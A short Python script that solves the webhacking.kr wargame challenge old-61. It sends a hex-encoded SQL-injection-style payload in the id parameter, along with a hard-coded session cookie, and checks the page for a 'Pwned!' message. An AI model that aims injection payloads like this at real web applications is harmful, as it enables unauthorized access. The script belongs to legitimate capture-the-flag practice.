import requests

url = "https://webhacking.kr/challenge/web-38?"
cookie = {'PHPSESSID':'9lv1si15q4h3an2c7j2f6bt1k1'}

def solve():
    payload = "id=0x61646d696e%20id"
    res = requests.get(url=url+payload, cookies=cookie)
    if "old-61 Pwned!" in res.text:
        print("old-61 Pwned!")
    elif 'already solve' in res.text:
        print("already solve")

if __name__ == "__main__":
    solve()
